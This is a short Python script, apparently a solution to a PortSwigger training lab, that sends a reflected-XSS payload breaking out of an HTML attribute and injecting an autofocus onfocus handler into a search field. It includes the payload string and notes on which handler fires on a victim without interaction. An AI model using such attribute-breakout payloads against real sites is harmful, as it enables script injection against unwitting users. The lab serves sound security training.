# Lab 07 — Reflected XSS into attribute with angle brackets HTML-encoded
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
#
# Vulnerability: Search functionality
# Aim:           Call alert via reflected XSS in an attribute context
#
# Technique:
#   The search term lands inside an HTML attribute:
#     <input value="SEARCH_TERM">
#   Angle brackets are HTML-encoded → can't inject new tags.
#   But double quotes are NOT encoded → break out of the attribute value
#   and inject a new event handler in the same opening tag:
#
#     Input: " autofocus onfocus="alert(1)
#     Result: <input value="" autofocus onfocus="alert(1)">
#
#   autofocus makes the browser focus the element on page load → onfocus fires
#   immediately, with no user interaction needed.
#
#   ✔  autofocus onfocus is safe for victim delivery (auto-fires on load).
#   ✘  onmouseover would require the victim to hover over the field — unreliable.
#
# Usage: python xss_lab07.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = '" autofocus onfocus="alert(1)'

if __name__ == "__main__":
    banner()
    section("LAB 07 — REFLECTED XSS: ATTRIBUTE CONTEXT, ANGLE BRACKETS ENCODED")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab07.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending payload: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    # Check for the attribute-breaking payload in the response
    check_reflection(r.text, PAYLOAD, "Attribute-break payload")

    print()
    print("  ➜  Open this URL in a browser — onfocus fires automatically via autofocus:")
    print(f"     {r.url}")
    print("  ℹ  The broken attribute injects onfocus into the same <input> tag.")
